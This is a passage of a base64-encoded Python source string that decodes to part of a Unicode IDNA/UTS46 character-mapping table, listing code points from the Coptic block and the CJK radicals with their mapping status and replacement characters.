lMlx4YjJceDliXCcpLFxuICAgICgweDJDOUIsIFwnVlwnKSxcbiAgICAoMHgyQzlDLCBcJ01cJywgXCdceGUyXHhiMlx4OWRcJyksXG4gICAgKDB4MkM5RCwgXCdWXCcpLFxuICAgICgweDJDOUUsIFwnTVwnLCBcJ1x4ZTJceGIyXHg5ZlwnKSxcbiAgICAoMHgyQzlGLCBcJ1ZcJyksXG4gICAgKDB4MkNBMCwgXCdNXCcsIFwnXHhlMlx4YjJceGExXCcpLFxuICAgICgweDJDQTEsIFwnVlwnKSxcbiAgICAoMHgyQ0EyLCBcJ01cJywgXCdceGUyXHhiMlx4YTNcJyksXG4gICAgKDB4MkNBMywgXCdWXCcpLFxuICAgICgweDJDQTQsIFwnTVwnLCBcJ1x4ZTJceGIyXHhhNVwnKSxcbiAgICAoMHgyQ0E1LCBcJ1ZcJyksXG4gICAgKDB4MkNBNiwgXCdNXCcsIFwnXHhlMlx4YjJceGE3XCcpLFxuICAgICgweDJDQTcsIFwnVlwnKSxcbiAgICAoMHgyQ0E4LCBcJ01cJywgXCdceGUyXHhiMlx4YTlcJyksXG4gICAgKDB4MkNBOSwgXCdWXCcpLFxuICAgICgweDJDQUEsIFwnTVwnLCBcJ1x4ZTJceGIyXHhhYlwnKSxcbiAgICAoMHgyQ0FCLCBcJ1ZcJyksXG4gICAgKDB4MkNBQywgXCdNXCcsIFwnXHhlMlx4YjJceGFkXCcpLFxuICAgICgweDJDQUQsIFwnVlwnKSxcbiAgICAoMHgyQ0FFLCBcJ01cJywgXCdceGUyXHhiMlx4YWZcJyksXG4gICAgKDB4MkNBRiwgXCdWXCcpLFxuICAgICgweDJDQjAsIFwnTVwnLCBcJ1x4ZTJceGIyXHhiMVwnKSxcbiAgICAoMHgyQ0IxLCBcJ1ZcJyksXG4gICAgKDB4MkNCMiwgXCdNXCcsIFwnXHhlMlx4YjJceGIzXCcpLFxuICAgICgweDJDQjMsIFwnVlwnKSxcbiAgICAoMHgyQ0I0LCBcJ01cJywgXCdceGUyXHhiMlx4YjVcJyksXG4gICAgKDB4MkNCNSwgXCdWXCcpLFxuICAgICgweDJDQjYsIFwnTVwnLCBcJ1x4ZTJceGIyXHhiN1wnKSxcbiAgICAoMHgyQ0I3LCBcJ1ZcJyksXG4gICAgKDB4MkNCOCwgXCdNXCcsIFwnXHhlMlx4YjJceGI5XCcpLFxuICAgICgweDJDQjksIFwnVlwnKSxcbiAgICAoMHgyQ0JBLCBcJ01cJywgXCdceGUyXHhiMlx4YmJcJyksXG4gICAgKDB4MkNCQiwgXCdWXCcpLFxuICAgICgweDJDQkMsIFwnTVwnLCBcJ1x4ZTJceGIyXHhiZFwnKSxcbiAgICAoMHgyQ0JELCBcJ1ZcJyksXG4gICAgKDB4MkNCRSwgXCdNXCcsIFwnXHhlMlx4YjJceGJmXCcpLFxuICAgICgweDJDQkYsIFwnVlwnKSxcbiAgICAoMHgyQ0MwLCBcJ01cJywgXCdceGUyXHhiM1x4ODFcJyksXG4gICAgKDB4MkNDMSwgXCdWXCcpLFxuICAgICgweDJDQzIsIFwnTVwnLCBcJ1x4ZTJceGIzXHg4M1wnKSxcbiAgICBdXG5cbmRlZiBfc2VnXzI2KCkgLT4gTGlzdFtVbmlvbltUdXBsZVtpbnQsIHN0cl0sIFR1cGxlW2ludCwgc3RyLCBzdHJdXV06XG4gICAgcmV0dXJuIFtcbiAgICAoMHgyQ0MzLCBcJ1ZcJyksXG4gICAgKDB4MkNDNCwgXCdNXCcsIFwnXHhlMlx4YjNceDg1XCcpLFxuICAgICgweDJDQzUsIFwnVlwnKSxcbiAgICAoMHgyQ0M2LCBcJ01cJywgXCdceGUyXHhiM1x4ODdcJyksXG4gICAgKDB4MkNDNywgXCdWXCcpLFxuICAgICgweDJDQzgsIFwnTVwnLCBcJ1x4ZTJceGIzXHg4OVwnKSxcbiAgICAoMHgyQ0M5LCBcJ1ZcJyksXG4gICAgKDB4MkNDQSwgXCdNXCcsIFwnXHhlMlx4YjNceDhiXCcpLFxuICAgICgweDJDQ0IsIFwnVlwnKSxcbiAgICAoMHgyQ0NDLCBcJ01cJywgXCdceGUyXHhiM1x4OGRcJyksXG4gICAgKDB4MkNDRCwgXCdWXCcpLFxuICAgICgweDJDQ0UsIFwnTVwnLCBcJ1x4ZTJceGIzXHg4ZlwnKSxcbiAgICAoMHgyQ0NGLCBcJ1ZcJyksXG4gICAgKDB4MkNEMCwgXCdNXCcsIFwnXHhlMlx4YjNceDkxXCcpLFxuICAgICgweDJDRDEsIFwnVlwnKSxcbiAgICAoMHgyQ0QyLCBcJ01cJywgXCdceGUyXHhiM1x4OTNcJyksXG4gICAgKDB4MkNEMywgXCdWXCcpLFxuICAgICgweDJDRDQsIFwnTVwnLCBcJ1x4ZTJceGIzXHg5NVwnKSxcbiAgICAoMHgyQ0Q1LCBcJ1ZcJyksXG4gICAgKDB4MkNENiwgXCdNXCcsIFwnXHhlMlx4YjNceDk3XCcpLFxuICAgICgweDJDRDcsIFwnVlwnKSxcbiAgICAoMHgyQ0Q4LCBcJ01cJywgXCdceGUyXHhiM1x4OTlcJyksXG4gICAgKDB4MkNEOSwgXCdWXCcpLFxuICAgICgweDJDREEsIFwnTVwnLCBcJ1x4ZTJceGIzXHg5YlwnKSxcbiAgICAoMHgyQ0RCLCBcJ1ZcJyksXG4gICAgKDB4MkNEQywgXCdNXCcsIFwnXHhlMlx4YjNceDlkXCcpLFxuICAgICgweDJDREQsIFwnVlwnKSxcbiAgICAoMHgyQ0RFLCBcJ01cJywgXCdceGUyXHhiM1x4OWZcJyksXG4gICAgKDB4MkNERiwgXCdWXCcpLFxuICAgICgweDJDRTAsIFwnTVwnLCBcJ1x4ZTJceGIzXHhhMVwnKSxcbiAgICAoMHgyQ0UxLCBcJ1ZcJyksXG4gICAgKDB4MkNFMiwgXCdNXCcsIFwnXHhlMlx4YjNceGEzXCcpLFxuICAgICgweDJDRTMsIFwnVlwnKSxcbiAgICAoMHgyQ0VCLCBcJ01cJywgXCdceGUyXHhiM1x4YWNcJyksXG4gICAgKDB4MkNFQywgXCdWXCcpLFxuICAgICgweDJDRUQsIFwnTVwnLCBcJ1x4ZTJceGIzXHhhZVwnKSxcbiAgICAoMHgyQ0VFLCBcJ1ZcJyksXG4gICAgKDB4MkNGMiwgXCdNXCcsIFwnXHhlMlx4YjNceGIzXCcpLFxuICAgICgweDJDRjMsIFwnVlwnKSxcbiAgICAoMHgyQ0Y0LCBcJ1hcJyksXG4gICAgKDB4MkNGOSwgXCdWXCcpLFxuICAgICgweDJEMjYsIFwnWFwnKSxcbiAgICAoMHgyRDI3LCBcJ1ZcJyksXG4gICAgKDB4MkQyOCwgXCdYXCcpLFxuICAgICgweDJEMkQsIFwnVlwnKSxcbiAgICAoMHgyRDJFLCBcJ1hcJyksXG4gICAgKDB4MkQzMCwgXCdWXCcpLFxuICAgICgweDJENjgsIFwnWFwnKSxcbiAgICAoMHgyRDZGLCBcJ01cJywgXCdceGUyXHhiNVx4YTFcJyksXG4gICAgKDB4MkQ3MCwgXCdWXCcpLFxuICAgICgweDJENzEsIFwnWFwnKSxcbiAgICAoMHgyRDdGLCBcJ1ZcJyksXG4gICAgKDB4MkQ5NywgXCdYXCcpLFxuICAgICgweDJEQTAsIFwnVlwnKSxcbiAgICAoMHgyREE3LCBcJ1hcJyksXG4gICAgKDB4MkRBOCwgXCdWXCcpLFxuICAgICgweDJEQUYsIFwnWFwnKSxcbiAgICAoMHgyREIwLCBcJ1ZcJyksXG4gICAgKDB4MkRCNywgXCdYXCcpLFxuICAgICgweDJEQjgsIFwnVlwnKSxcbiAgICAoMHgyREJGLCBcJ1hcJyksXG4gICAgKDB4MkRDMCwgXCdWXCcpLFxuICAgICgweDJEQzcsIFwnWFwnKSxcbiAgICAoMHgyREM4LCBcJ1ZcJyksXG4gICAgKDB4MkRDRiwgXCdYXCcpLFxuICAgICgweDJERDAsIFwnVlwnKSxcbiAgICAoMHgyREQ3LCBcJ1hcJyksXG4gICAgKDB4MkREOCwgXCdWXCcpLFxuICAgICgweDJEREYsIFwnWFwnKSxcbiAgICAoMHgyREUwLCBcJ1ZcJyksXG4gICAgKDB4MkU1RSwgXCdYXCcpLFxuICAgICgweDJFODAsIFwnVlwnKSxcbiAgICAoMHgyRTlBLCBcJ1hcJyksXG4gICAgKDB4MkU5QiwgXCdWXCcpLFxuICAgICgweDJFOUYsIFwnTVwnLCBcJ1x4ZTZceGFmXHg4ZFwnKSxcbiAgICAoMHgyRUEwLCBcJ1ZcJyksXG4gICAgKDB4MkVGMywgXCdNXCcsIFwnXHhlOVx4YmVceDlmXCcpLFxuICAgICgweDJFRjQsIFwnWFwnKSxcbiAgICAoMHgyRjAwLCBcJ01cJywgXCdceGU0XHhiOFx4ODBcJyksXG4gICAgKDB4MkYwMSwgXCdNXCcsIFwnXHhlNFx4YjhceGE4XCcpLFxuICAgICgweDJGMDIsIFwnTVwnLCBcJ1x4ZTRceGI4XHhiNlwnKSxcbiAgICAoMHgyRjAzLCBcJ01cJywgXCdceGU0XHhiOFx4YmZcJyksXG4gICAgKDB4MkYwNCwgXCdNXCcsIFwnXHhlNFx4YjlceDk5XCcpLFxuICAgICgweDJGMDUsIFwnTVwnLCBcJ1x4ZTRceGJhXHg4NVwnKSxcbiAgICAoMHgyRjA2LCBcJ01cJywgXCdceGU0XHhiYVx4OGNcJyksXG4gICAgKDB4MkYwNywgXCdNXCcsIFwnXHhlNFx4YmFceGEwXCcpLFxuICAgICgweDJGMDgsIFwnTVwnLCBcJ1x4ZTRceGJhXHhiYVwnKSxcbiAgICAoMHgyRjA5LCBcJ01cJywgXCdceGU1XHg4NFx4YmZcJyksXG4gICAgKDB4MkYwQSwgXCdNXCcsIFwnXHhlNVx4ODVceGE1XCcpLFxuICAgICgweDJGMEIsIFwnTVwnLCBcJ1x4ZTVceDg1XHhhYlwnKSxcbiAgICAoMHgyRjBDLCBcJ01cJywgXCdceGU1XHg4Nlx4ODJcJyksXG4gICAgKDB4MkYwRCwgXCdNXCcsIFwnXHhlNVx4ODZceDk2XCcpLFxuICAgICgweDJGMEUsIFwnTVwnLCBcJ1x4ZTVceDg2XHhhYlwnKSxcbiAgICAoMHgyRjBGLCBcJ01cJywgXCdceGU1XHg4N1x4YTBcJyksXG4gICAgKDB4MkYxMCwgXCdNXCcsIFwnXHhlNVx4ODdceGI1XCcpLFxuICAgICgweDJGMTEsIFwnTVwnLCBcJ1x4ZTVceDg4XHg4MFwnKSxcbiAgICAoMHgyRjEyLCBcJ01cJywgXCdceGU1XHg4YVx4OWJcJyksXG4gICAgKDB4MkYxMywgXCdNXCcsIFwnXHhlNVx4OGJceGI5XCcpLFxuICAgICgweDJGMTQsIFwnTVwnLCBcJ1x4ZTVceDhjXHg5NVwnKSxcbiAgICAoMHgyRjE1LCBcJ01cJywgXCdceGU1XHg4Y1x4OWFcJyksXG4gICAgXVxuXG5kZWYgX3NlZ18yNygpIC0+IExpc3RbVW5pb25bVHVwbGVbaW50LCBzdHJdLCBUdXBsZVtpbnQsIHN0ciwgc3RyXV1dOlxuICAgIHJldHVybiBbXG4gICAgKDB4MkYxNiwgXCdNXCcsIFwnXHhlNVx4OGNceGI4XCcpLFxuICAgICgweDJGMTcsIFwnTVwnLCBcJ1x4ZTVceDhkXHg4MVwnKSxcbiAgICAoMHgyRjE4LCBcJ01cJywgXCdceGU1XHg4ZFx4OWNcJyksXG4gICAgKDB4MkYxOSwgXCdNXCcsIFwnXHhlNVx4OGRceGE5XCcpLFxuICAgICgweDJGMUEsIFwnTVwnLCBcJ1x4ZTVceDhlXHg4MlwnKSxcbiAgICAoMHgyRjFCLCBcJ01cJywgXCdceGU1XHg4ZVx4YjZcJyksXG4gICAgKDB4MkYxQywgXCdNXCcsIFwnXHhlNVx4OGZceDg4XCcpLFxuICAgICgweDJGMUQsIFwnTVwnLCBcJ1x4ZTVceDhmXHhhM1wnKSxcbiAgICAoMHgyRjFFLCBcJ01cJywgXCdceGU1XHg5Ylx4OTdcJyksXG4gICAgKDB4MkYxRiwgXCdNXCcsIFwnXHhlNVx4OWNceDlmXCcpLFxuICAgICgweDJGMjAsIFwnTVwnLCBcJ1x4ZTVceGEzXHhhYlwnKSxcbiAgICAoMHgyRjIxLCBcJ01cJywgXCdceGU1XHhhNFx4ODJcJyksXG4gICAgKDB4MkYyMiwgXCdNXCcsIFwnXHhlNVx4YTRceDhhXCcpLFxuICAgICgweDJGMjMsIFwnTVwnLCBcJ1x4ZTVceGE0XHg5NVwnKSxcbiAgICAoMHgyRjI0LCBcJ01cJywgXCdceGU1XHhhNFx4YTdcJyksXG4gICAgKDB4MkYyNSwgXCdNXCcsIFwnXHhlNVx4YTVceGIzXCcpLFxuICAgICgweDJGMjYsIFwnTVwnLCBcJ1x4ZTVceGFkXHg5MFwnKSxcbiAgICAoMHgyRjI3LCBcJ01cJywgXCdceGU1XHhhZVx4ODBcJyksXG4gICAgKDB4MkYyOCwgXCdNXCcsIFwnXHhlNVx4YWZceGI4XCcpLFxuICAgICgweDJGMjksIFwnTVwnLCBcJ1x4ZTVceGIwXHg4ZlwnKSxcbiAgICAoMHgyRjJBLCBcJ01cJywgXCdceGU1XHhiMFx4YTJcJyksXG4gICAgKDB4MkYyQiwgXCdNXCcsIFwnXHhlNVx4YjBceGI4XCcpLFxuICAgICgweDJGMkMsIFwnTVwnLCBcJ1x4ZTVceGIxXHhhZVwnKSxcbiAgICAoMHgyRjJELCBcJ01cJywgXCdceGU1XHhiMVx4YjFcJyksXG4gICAgKDB4MkYyRSwgXCdNXCcsIFwnXHhlNVx4YjdceDliXCcpLFxuICAgICgweDJGMkYsIFwnTVwnLCBcJ1x4ZTVceGI3XHhhNVwnKSxcbiAgICAoMHgyRjMwLCBcJ01cJywgXCdceGU1XHhiN1x4YjFcJyksXG4gICAgKDB4MkYzMSwgXCdNXCcsIFwnXHhlNVx4YjdceGJlXCcpLFxuICAgICgweDJGMzIsIFwnTVwnLCBcJ1x4ZTVceGI5XHhiMlwnKSxcbiAgICAoMHgyRjMzLCBcJ01cJywgXCdceGU1XHhiOVx4YmFcJyksXG4gICAgKDB4MkYzNCwgXCdNXCcsIFwnXHhlNVx4YjlceGJmXCcpLFxuICAgICgweDJGMzUsIFwnTVwnLCBcJ1x4ZTVceGJiXHhiNFwnKSxcbiAgICAoMHgyRjM2LCBcJ01cJywgXCdceGU1XHhiYlx4YmVcJyksXG4gICAgKDB4MkYzNywgXCdNXCcsIFwnXHhlNVx4YmNceDhiXCcpLFxuICAgICgweDJGMzgsIFwnTVwnLCBcJ1x4ZTVceGJjXHg5M1wnKSxcbiAgICAoMHgyRjM5LCBcJ01cJywgXCdceGU1XHhiZFx4OTBcJyksXG4gICAgKDB4MkYzQSwgXCdNXCcsIFwnXHhlNVx4YmRceGExXCcpLFxuICAgICgweDJGM0IsIFwnTVwnLCBcJ1x4ZTVceGJkXHhiM1wnKSxcbiAgICAoMHgyRjNDLCBcJ01cJywgXCdceGU1XHhiZlx4ODNcJyksXG4gICAgKDB4MkYzRCwgXCdNXCcsIFwnXHhlNlx4ODhceDg4XCcpLFxuICAgICgweDJGM0UsIFwnTVwnLCBcJ1x4ZTZceDg4XHhiNlwnKSxcbiAgICAoMHgyRjNGLCBcJ01cJywgXCdceGU2XHg4OVx4OGJcJyksXG4gICAgKDB4MkY0MCwgXCdNXCcsIFwnXHhlNlx4OTRceGFmXCcpLFxuICAgICgweDJGNDEsIFwnTVwnLCBcJ1x4ZTZceDk0XHhiNFwnKSxcbiAgICAoMHgyRjQyLCBcJ01cJywgXCdceGU2XHg5Nlx4ODdcJyksXG4gICAgKDB4MkY0MywgXCdNXCcsIFwnXHhlNlx4OTZceDk3XCcpLFxuICAgICgweDJGNDQsIFwnTVwnLCBcJ1x4ZTZceDk2XHhhNFwnKSxcbiAgICAoMHgyRjQ1LCBcJ01cJywgXCdceGU2XHg5Nlx4YjlcJyksXG4gICAgKDB4MkY0NiwgXCdNXCcsIFwnXHhlNlx4OTdceGEwXCcpLFxuICAgICgweDJGNDcsIFwnTVwnLCBcJ1x4ZTZceDk3XHhhNVwnKSxcbiAgICAoMHgyRjQ4LCBcJ01cJywgXCdceGU2XHg5Ylx4YjBcJyksXG4gICAgKDB4MkY0OSwgXCdNXCcsIFwnXHhlNlx4OWNceDg4XCcpLFxuICAgICgweDJGNEEsIFwnTVwnLCBcJ1x4ZTZceDljXHhhOFwnKSxcbiAgICAoMHgyRjRCLCBcJ01cJywgXCdceGU2XHhhY1x4YTBcJyksXG4gICAgKDB4MkY0QywgXCdNXCcsIFwnXHhlNlx4YWRceGEyXCcpLFxuICAgICgweDJGNEQsIFwnTVwnLCBcJ1x4ZTZceGFkXHhiOVwnKSxcbiAgICAoMHgyRjRFLCBcJ01cJywgXCdceGU2XHhhZVx4YjNcJyksXG4gICAgKDB4MkY0RiwgXCdNXCcsIFwnXHhlNlx4YWZceDhiXCcpLFxuICAgICgweDJGNTAsIFwnTVwnLCBcJ1x4ZTZceGFmXHg5NFwnKSxcbiAgICAoMHgyRjUxLCBcJ01cJywgXCdceGU2XHhhZlx4OWJcJyksXG4gICAgKDB4MkY1MiwgXCdNXCcsIFwnXHhlNlx4YjBceDhmXCcpLFxuICAgICgweDJGNTMsIFwnTVwnLCBcJ1x4ZTZceGIwXHg5NFwnKSxcbiAgICAoMHgyRjU0LCBcJ01cJywgXCdceGU2XHhiMFx4YjRcJyksXG4gICAgKDB4MkY1NSwgXCdNXCcsIFwnXHhlN1x4ODFceGFiXCcpLFxuICAgICgweDJGNTYsIFwnTVwnLCBcJ1x4ZTdceDg4XHhhYVwnKSxcbiAgICAoMHgyRjU3LCBcJ01cJywgXCdceGU3XHg4OFx4YjZcJyksXG4gICAgKDB4MkY1OCwgXCdNXCcsIFwnXHhlN1x4ODhceGJiXCcpLFxuICAgICgweDJGNTksIFwnTVwnLCBcJ1x4ZTdceDg4XHhiZlwnKSxcbiAgICAoMHgyRjVBLCBcJ01cJywgXCdceGU3XHg4OVx4ODdcJyksXG4gICAgKDB4MkY1QiwgXCdNXCcsIFwnXHhlN1x4ODlceDk5XCcpLFxuICAgICgweDJGNUMsIFwnTVwnLCBcJ1x4ZTdceDg5XHg5YlwnKSxcbiAgICAoMHgyRjVELCBcJ01cJywgXCdceGU3XHg4YVx4YWNcJyksXG4gICAgKDB4MkY1RSwgXCdNXCcsIFwnXHhlN1x4OGVceDg0XCcpLFxuICAgICgweDJGNUYsIFwnTVwnLCBcJ1x4ZTdceDhlXHg4OVwnKSxcbiAgICAoMHgyRjYwLCBcJ01cJywgXCdceGU3XHg5M1x4OWNcJyksXG4gICAgKDB4MkY2MSwgXCdNXCcsIFwnXHhlN1x4OTNceGE2XCcpLFxuICAgICgweDJGNjIsIFwnTVwnLCBcJ1x4ZTdceDk0XHg5OFwnKSxcbiAgICAoMHgyRjYzLCBcJ01cJywgXCdceGU3XHg5NFx4OWZcJyksXG4gICAgKDB4MkY2NCwgXCdNXCcsIFwnXHhlN1x4OTRceGE4XCcpLFxuICAgICgweDJGNjUsIFwnTVwnLCBcJ1x4ZTdceDk0XHhiMFwnKSxcbiAgICAoMHgyRjY2LCBcJ01cJywgXCdceGU3XHg5Nlx4OGJcJyksXG4gICAgKDB4MkY2NywgXCdNXCcsIFwnXHhlN1x4OTZceDkyXCcpLFxuICAgICgweDJGNjgsIFwnTVwnLCBcJ1x4ZTdceDk5XHhiNlwnKSxcbiAgICAoMHgyRjY5LCBcJ01cJywgXCdceGU3XHg5OVx4YmRcJyksXG4gICAgKDB4MkY2QSwgXCdNXCcsIFwnXHhlN1x4OWFceGFlXCcpLFxuICAgICgweDJGNkIsIFwnTVwnLCBcJ1x4ZTdceDlhXHhiZlwnKSxcbiAgICAoMHgyRjZDLCBcJ01cJywgXCdceGU3XHg5Ylx4YWVcJyksXG4gICAgKDB4MkY2RCwgXCdNXCcsIFwnXHhlN1x4OWZceDliXCcpLFxuICAgICgweDJGNkUsIFwnTVwnLCBcJ1x4ZTdceDlmXHhhMlwnKSxcbiAgICAoMHgyRjZGLCBcJ01cJywgXCdceGU3XHg5Zlx4YjNcJyksXG4gICAgKDB4MkY3MCwgXCdNXCcsIFwnXHhlN1x4YTRceGJhXCcpLFxuICAgICgweDJGNzEsIFwnTVwnLCBcJ1x4ZTdceGE2XHhiOFwnKSxcbiAgICAoMHgyRjcyLCBcJ01cJywgXCdceGU3XHhhNlx4YmVcJyksXG4gICAgKDB4MkY3MywgXCdNXCcsIFwnXHhlN1x4YTlceGI0XCcpLFxuICAgICgweDJGNzQsIFwnTVwnLCBcJ1x4ZTdceGFiXHg4YlwnKSxcbiAgICAoMHgyRjc1LCBcJ01cJywgXCdceGU3XHhhYlx4YjlcJyksXG4gICAgKDB4MkY3NiwgXCdNXCcsIFwnXHhlN1x4YjFceGIzXCcpLFxuICAgICgweDJGNzcsIFwnTVwnLCBcJ1x4ZTdceGIzXHhiOFwnKSxcbiAgICAoMHgyRjc4LCBcJ01cJywgXCdceGU3XHhiY1x4YjZcJyksXG4gICAgKDB4MkY3OSwgXCdNXCcsIFwnXHhlN1x4YmRceDkxXCcpLFxuICAgIF1cblxuZGVmIF9zZWdfMjgoKSAtPiBMaXN0W1VuaW9uW1R1cGxlW2ludCwgc3RyXSwgVHVwbGVbaW50LCBzdHIsIHN0cl1dXTpcbiAgICByZXR1cm4gW1xuICAgICgweDJGN0EsIFwnTVwnLCBcJ1x4ZTdceGJlXHg4YVwnKSxcbiAgICAoMHgyRjdCLCBcJ01cJywgXCdceGU3XHhiZVx4YmRcJyksXG4gICAgKDB4MkY3QywgXCdNXCcsIFwnXHhlOFx4ODBceDgxXCcpLFxuICAgICgweDJGN0QsIFwnTVwnLCBcJ1x4ZThceDgwXHg4Y1wnKSxcbiAgICAoMHgyRjdFLCBcJ01cJywgXCdceGU4XHg4MFx4OTJcJyksXG4gICAgKDB4MkY3RiwgXCdNXCcsIFwnXHhlOFx4ODBceGIzXCcpLFxuICAgICgweDJGODAsIFwnTVwnLCBcJ1x4ZThceDgxXHhiZlwnKSxcbiAgICAoMHgyRjgxLCBcJ01cJywgXCdceGU4XHg4Mlx4ODlcJyksXG4gICAgKDB4MkY4MiwgXCdNXCcsIFwnXHhlOFx4ODdceGEzXCcpLFxuICAgICgweDJGODMsIFwnTVwnLCBcJ1x4ZThceDg3XHhhYVwnKSxcbiAgICAoMHgyRjg0LCBcJ01cJywgXCdceGU4XHg4N1x4YjNcJyksXG4gICAgKDB4MkY4NSwgXCdNXCcsIFwnXHhlOFx4ODdceGJjXCcpLFxuICAgICgweDJGODYsIFwnTVwnLCBcJ1x4ZThceDg4XHg4Y1wnKSxcbiAgICAoMHgyRjg3LCBcJ01cJywgXCdceGU4XHg4OFx4OWJcJyksXG4gICAgKDB4MkY4OCwgXCdNXCcsIFwnXHhlOFx4ODhceDlmXCcpLFxuICAgICgweDJGODksIFwnTVwnLCBcJ1x4ZThceDg5XHhhZVwnKSxcbiAgICAoMHgyRjhBLCBcJ01cJywgXCdceGU4XHg4OVx4YjJcJyksXG4gICAgKDB4MkY4QiwgXCdNXCcsIFwnXHhlOFx4ODlceGI4XCcpLFxuICAgICgweDJGOEMsIFwnTVwnLCBcJ1x4ZThceDk5XHg4ZFwnKSxcbiAgICAoMHgyRjhELCBcJ01cJywgXCdceGU4XHg5OVx4YWJcJyksXG4gICAgKDB4MkY4RSwgXCdNXCcsIFwnXHhlOFx4YTFceDgwXCcpLFxuICAgICgweDJGOEYsIFwnTVwnLCBcJ1x4ZThceGExXHg4Y1wnKSxcbiAgICAoMHgyRjkwLCBcJ01cJywgXCdceGU4XHhhMVx4YTNcJyksXG4gICAgKDB4MkY5MSwgXCdNXCcsIFwnXHhlOFx4YTVceGJlXCcpLFxuICAgICgweDJGOTIsIFwnTVwnLCBcJ1x4ZThceGE2XHg4YlwnKSxcbiAgICAoMHgyRjkzLCBcJ01cJywgXCdceGU4XHhhN1x4OTJcJyksXG4gICAgKDB4MkY5NCwgXCdNXCcsIFwnXHhlOFx4YThceDgwXCcpLFxuICAgICgweDJGOTUsIFwnTVwnLCBcJ1x4ZThceGIwXHhiN1wnKSxcbiAgICAoMHgyRjk2LCBcJ01cJywgXCdceGU4XHhiMVx4ODZcJyksXG4gICAgKDB4MkY5NywgXCdNXCcsIFwnXHhlOFx4YjFceDk1XCcpLFxuICAgICgweDJGOTgsIFwnTVwnLCBcJ1x4ZThceGIxXHhiOFwnKSxcbiAgICAoMHgyRjk5LCBcJ01cJywgXCdceGU4XHhiMlx4OWRcJyksXG4gICAgKDB4MkY5QSwgXCdNXCcsIFwnXHhlOFx4YjVceGE0XCcpLFxuICAgICgweDJGOUIsIFwnTVwnLCBcJ1x4ZThceGI1XHhiMFwnKSxcbiAgICAoMHgyRjlDLCBcJ01cJywgXCdceGU4XHhiNlx4YjNcJyksXG4gICAgKDB4MkY5RCwgXCdNXCcsIFwnXHhlOFx4YmFceGFiXCcpLFxuICAgICgweDJGOUUsIFwnTVwnLCBcJ1x4ZThceGJiXHg4YVwnKSxcbiAgICAoMHgyRjlGLCBcJ01cJywgXCdceGU4XHhiZVx4OWJcJyksXG4gICAgKDB4MkZBMCwgXCdNXCcsIFwnXHhlOFx4YmVceGIwXCcpLFxuICAgICgweDJGQTEsIFwnTVwnLCBcJ1x4ZThceGJlXHhiNVwnKSxcbiAgICAoMHgyRkEyLCBcJ01cJywgXCdceGU5XHg4Mlx4OTFcJyksXG4gICAgKDB4MkZBMywgXCdNXCcsIFwnXHhlOVx4ODVceDg5XCcpLFxuICAgICgweDJGQTQsIFwnTVwnLCBcJ1x4ZTlceDg3XHg4NlwnKSxcbiAgICAoMHgyRkE1LCBcJ01cJywgXCdceGU5XHg4N1x4OGNcJyksXG4gICAgKDB4MkZBNiwgXCdNXCcsIFwnXHhlOVx4ODdceDkxXCcpLFxuICAgICgweDJGQTcsIFwnTVwnLCBcJ1x4ZTlceDk1XHhiN1wnKSxcbiAgICAoMHgyRkE4LCBcJ01cJywgXCdceGU5XHg5Nlx4ODBcJyksXG4gICAgKDB4MkZBOSwgXCdNXCcsIFwnXHhlOVx4OThceDljXCcpLFxuICAgICgweDJGQUEsIFwnTVwnLCBcJ1x4ZTlceDlhXHhiNlwnKSxcbiAgICAoMHgyRkFCLCBcJ01cJywgXCdceGU5XHg5YVx4YjlcJyksXG4gICAgKDB4MkZBQywgXCdNXCcsIFwnXHhlOVx4OWJceGE4XCcpLFxuICAgICgweDJGQUQsIFwnTVwnLCBcJ1x4ZTlceDlkXHg5MVwnKSxcbiAgICAoMHgyRkFFLCBcJ01cJywgXCdceGU5XHg5ZFx4OWVcJyksXG4gICAgKDB4MkZBRiwgXCdNXCcsIFwnXHhlOVx4OWRceGEyXCcpLFxuICAgICgweDJGQjAsIFwnTVwnLCBcJ1x4ZTlceDlkXHhhOVwnKSxcbiAgICAoMHgyRkIxLCBcJ01cJywgXCdceGU5XHg5Zlx4OGJcJyksXG4gICAgKDB4MkZCMiwgXCdNXCcsIFwnXHhlOVx4OWZceGFkXCcpLFxuICAgICgweDJGQjMsIFwnTVwnLCBcJ1x4ZTlceDlmXHhiM1wnKSxcbiAgICAoMHgyRkI0LCBcJ01cJywgXCdceGU5XHhhMFx4ODFcJyksXG4gICAgKDB4MkZCNSwgXCdNXCcsIFwnXHhlOVx4YTJceGE4XCcpLFxuICAgICgweDJGQjYsIFwnTVwnLCBcJ1x4ZTlceGEzXHg5YlwnKSxcbiAgICAoMHgyRkI3LCBcJ01cJywgXCdceGU5XHhhM1x4OWZcJyksXG4gICAgKDB4MkZCOCwgXCdNXCcsIFwnXHhlOVx4YTZceDk2XCcpLFxuICAgICgweDJGQjksIFwnTVwnLCBcJ1x4ZTlceGE2XHg5OVwnKSxcbiAgICAoMHgyRkJBLCBcJ01cJywgXCdceGU5XHhhNlx4YWNcJyksXG4gICAgKDB4MkZCQiwgXCdNXCcsIFwnXHhlOVx4YWFceGE4XCcpLFxuICAgICgweDJGQkMsIFwnTVwnLCBcJ1x4ZTlceGFiXHg5OFwnKSxcbiAgICAoMHgyRkJELCBcJ01cJywgXCdceGU5XHhhYlx4OWZcJyksXG4gICAgKDB4MkZCRSwgXCdNXCcsIFwnXHhlOVx4YWNceGE1XCcpLFxuICAgICgweDJGQkYsIFwnTVwnLCBcJ1x4ZTlceGFjXHhhZlwnKSxcbiAgICAoMHgyRkMwLCBcJ01cJywgXCdceGU5XHhhY1x4YjJcJyksXG4gICAgKDB4MkZDMSwgXCdNXCcsIFwnXHhlOVx4YWNceGJjXCcpLFxuICAgICgweDJGQzIsIFwnTVwnLCBcJ1x4ZTlceGFkXHg5YVwnKSxcbiAgICAoMHgyRkMzLCBcJ01cJywgXCdceGU5XHhiM1x4YTVcJyksXG4gICAgKDB4MkZDNCwgXCdNXCcsIFwnXHhlOVx4YjlceGI1XCcpLFxuICAgICgweDJGQzUsIFwnTVwnLCBcJ1x4ZTlceGI5XHhiZlwnKSxcbiAgICAoMHgyRkM2LCBcJ01cJywgXCdceGU5XHhiYVx4YTVcJyksXG4gICAgKDB4MkZDNywgXCdNXCcsIFwnXHhlOVx4YmFceGJiXCcpLFxuICAgICgweDJGQzgsIFwnTVwnLCBcJ1x4ZTlceGJiXHg4M1wnKSxcbiAgICAoMHgyRkM5LCBcJ01cJywgXCdceGU5XHhiYlx4OGRcJyksXG4gICAgKDB4MkZDQSwgXCdNXCcsIFwnXHhlOVx4YmJceDkxXCcpLFxuICAgICgweDJGQ0IsIFwnTVwnLCBcJ1x4ZTlceGJiXHhiOVwnKSxcbiAgICAoMHgyRkNDLCBcJ01cJywgXCdceGU5XHhiYlx4YmRcJyksXG4gICAgKDB4